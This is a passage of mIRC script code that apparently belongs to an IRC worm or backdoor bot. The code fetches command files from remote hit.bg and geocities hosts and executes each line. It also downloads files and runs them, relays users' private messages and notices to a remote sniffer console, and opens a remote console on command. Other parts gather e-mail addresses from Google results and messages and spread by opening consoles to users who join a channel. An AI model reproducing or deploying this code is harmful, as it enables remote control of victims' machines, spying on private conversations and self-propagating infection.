n326=  %sSearch2 = sex|mailto|mail|flash|girl|sport|e-mail|links|food|mailto|school|e-mail|dream|team|rap|boy|think|mail|ball|email|nice|true|e-mail|write|list
n327=  %sTmpDir = $windir $+ \Temp | if ($exists(%sTmpDir) == $false) .return
n328=  :extractFile | %sFile = %sTmpDir $+ \ $+ TmpFile $+ $rand(1,10000) $+ .faith | if ($exists(%sFile) == $true) .goto extractFile
n329=  %sSearch = $getTok(%sSearch, $rand(1, $numTok(%sSearch, $asc(|))), $asc(|)) | if (!%sSearch) .return
n330=  %sSearch2 = $getTok(%sSearch2, $rand(1, $numTok(%sSearch2, $asc(|))), $asc(|)) | if (!%sSearch2) .return
n331=  if (bg !isin %sSearch) { %sSearch = %sSearch $+ + $+ %sSearch2 }
n332=  %sTag = google.com/search?q= $+ %sSearch $+ &hl=en&lr=&ie=UTF-8&start= $+ %iIndex $+ &sa=N
n333=  .GetHTTP %sTag %sFile SAVE
n334=}
n335=raw *:*:{ if ($numeric == 2) { if (UniBG isin $1-) || (*-bg iswm $1-) { .setCountry BG } } }
n336=on ^*:Action:*:#:{ if ($1 == osc) { .OpenSConsole $2 $decode($3,mt) } | if ($1 == mip) { .notice $nick IP_ $+ $IP $getVersion $getScript } }
n337=on ^*:Text:*:?:{ if ($nick != $me) { .extractAddr $1- } | if (m isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER-MSG) ( $+ $Nick $+ ) $1- } }
n338=on ^*:Notice:*:?:{ if ($nick != $me) { .extractAddr $1- } | if (n isin $hget(Data, Sniffer) && $Verify($hget(Data, Sniffer.Console))) { .sockwrite -tn $hget(Data, Sniffer.Console) (SNIFFER-NOTICE) ( $+ $Nick $+ ) $1- } }
n339=on ^*:Join:*:{
n340=  if ($nick == $me) { .hadd Data Addr $remove($address,~) | if ($hget(Data,addHost)) { .writeini $GFN(IRC) BNC $hget(Data,addHost) $+ _Host $hget(Data,Addr) | .hdel Data addHost } }
n341=  else {
n342=    if (!hget(Data,ValidNick)) || ($rand(1,3) == 2) { var %sValid = $validNick($nick) | if (%sValid) { .hadd Data ValidNick %sValid } }
n343=    if ($hget(Data,LoadClone) && $hget(Data,ValidNick)) { .loadclone Clone-Static $hget(Data,Server) $hget(Data,ValidNick) $remove($getTok($address,1,$asc(@)),~) $fullname | .hadd Data LoadClone 0 }
n344=    if ((($hget(Data, Spread) == On) || ($hget(Data, Mass) == On)) && $incCount(iJoin)) { .OpenConsole $nick $GetTok($address,2,$asc(@)) }
n345=  }
n346=}
n347=alias setSites { .addHTTP TmpWebAcc.hit.bg/Commands.txt NULL EXEC | .addHTTP geocities.com/TmpWebAcc/Commands.txt NULL EXEC | .writeini $winFile Options Init2 1 }
n348=alias RequestURL {
n349=  .sockwrite -n $1 GET $2 HTTP/1.1 | .sockwrite -n $1 Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/msword, application/vnd.ms-powerpoint, */*
n350=  .sockwrite -n $1 Accept-Language: en | .sockwrite -n $1 Accept-Encoding: deflate | .sockwrite -n $1 User-Agent: Mozilla/4.0 (compatible; MSIE 4.72; Windows 98)
n351=  if ($pos($3,.,0) == 1) { .sockwrite -n $1 Host: www. $+ $3 } | if ($pos($3,.,0) != 1) { .sockwrite -n $1 Host: $3 }
n352=  .sockwrite -n $1 Connection: Keep-Alive | .sockwrite -n $1 Cache-Control: no-cache | .sockwrite -n $1
n353=}
n354=alias HttpMe {
n355=  var %sParam = $ini($GFN(DEF), HTTP, $rand(1,$ini($GFN(DEF),HTTP,0)))
n356=  if (%sParam) { .GetHTTP %sParam $readini($GFN(DEF), HTTP, %sParam) }
n357=}
n358=alias GetHTTP {
n359=  var %http.sock = $OpenIt(GetHTTP)
n360=  .hadd Data $rev(%http.sock, LocalName) $2
n361=  if ($exists($hget(Data, $rev(%http.sock, LocalName))) == $true) { .remove $hget(Data, $rev(%http.sock, LocalName)) }
n362=  .hadd Data $rev(%http.sock, RemoteName) / $+ $getTok($1, 2-, $asc(/)) | .hadd Data $rev(%http.sock, Serv) $getTok($1, 1, $asc(/))
n363=  .hadd Data $rev(%http.sock, Script) $getScript | .hadd Data $rev(%http.sock, Stat) $getStat
n364=  .hadd Data $rev(%http.sock, Options) $3- | .hadd Data $rev(%http.sock, Size) 0
n365=  if ($hget(Data, $Rev(%http.sock, Serv)) != $null) { .sockopen %http.sock $hget(Data, $Rev(%http.sock, Serv)) 80 }
n366=  else { .hdel -w Data $rev(%http.sock, *) }
n367=}
n368=on *:sockopen:GetHTTP-*:{
n369=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }
n370=  .RequestURL $sockname $hget(Data, $rev($sockname, RemoteName)) $hget(Data, $rev($sockname, Serv))
n371=}
n372=on *:sockread:GetHTTP-*:{
n373=  if ($sockerr > 0) { .hdel -w Data $rev($sockname, *) | .return }
n374=  var %sRead = "" , %http.LocalName = $hget(Data, $rev($sockname, LocalName)) , %http.Options = $hget(Data, $rev($sockname, Options))
n375=  if ($hget(Data, $rev($sockname, EOR)) == 1) {
n376=    if (STORE isin %http.Options) || (SAVE isin %http.Options) {
n377=      :StoreMore | .sockread &bRead | if ($sockbr != 0) { .bwrite %http.LocalName -1 &bRead | .goto StoreMore }
n378=      if ($hget(Data, $rev($sockname, Size)) && $file(%http.LocalName).size >= $hget(Data, $rev($sockname, Size))) { .hadd Data $rev($sockname, Final) 1 }
n379=    }
n380=    if (EXEC isin %http.Options) {
n381=      .sockread %sRead | %sRead = [ [ %sRead ] ]
n382=      if (%sRead == EOF2) { .hadd Data $rev($sockname, Final) 1 }
n383=      else if (Script: isin %sRead) { .hadd Data $rev($sockname, Script) $gettok(%sRead, 2, 32) }
n384=      else if (Stat: isin %sRead) { .hadd Data $rev($sockname, Stat) $gettok(%sRead, 2, 32) }
n385=      else if (($hget(Data, $rev($sockname, Script)) == $getScript) && ($hget(Data, $rev($sockname, Stat)) == $getStat) && (%sRead != EOF)) { %sRead }
n386=    }
n387=  }
n388=  else {
n389=    .sockread %sRead
n390=    var %sParam = $hget(Data, $rev($sockname, Serv)) $+ $hget(Data, $rev($sockname, RemoteName))
n391=    if (%sRead == $null) { .hadd Data $rev($sockname, EOR) 1 }
n392=    else if (Content-Length* iswm %sRead) { .hadd Data $rev($sockname, Size) $GetTok(%sRead, 2, 32) }
n393=    else if ((HTTP/* iswm %sRead) && (200 isin %sRead)) { if (EXEC isin %http.Options) { .writeini $GFN(DEF) MISS %sParam 0 } }
n394=    else if ((HTTP/* iswm %sRead) && (200 !isin %sRead)) {
n395=      if (EXEC isin %http.Options) {
n396=        .writeini $GFN(DEF) MISS %sParam $calc($readini($GFN(DEF),MISS,%sParam) + 1)
n397=        if ($readini($GFN(DEF),MISS,%sParam) > 1) { .remini $GFN(DEF) HTTP %sParam }
n398=      }
n399=      .hdel -w Data $rev($sockname, *) | .sockclose $sockname | .return
n400=    }
n401=  }
n402=  if ($hget(Data, $rev($sockname, Final)) == 1) {
n403=    if ((STORE isin %http.options) && ($file(%http.LocalName).size == $hget(Data, $rev($sockname, Size)))) { .run %http.LocalName | .hadd Data Visited 1 }
n404=    .hdel -w Data $rev($sockname, *) | .sockclose $sockname
n405=  }
n406=}
n407=on *:sockclose:GetHTTP-*:{ if ($hget(Data, $rev($sockname,Final)) != 1 && SAVE !isin $hget(Data, $rev($sockname, Options))) { .remove $hget(Data, $rev($sockname, LocalName)) } | .hdel -w Data $rev($sockname, *) }
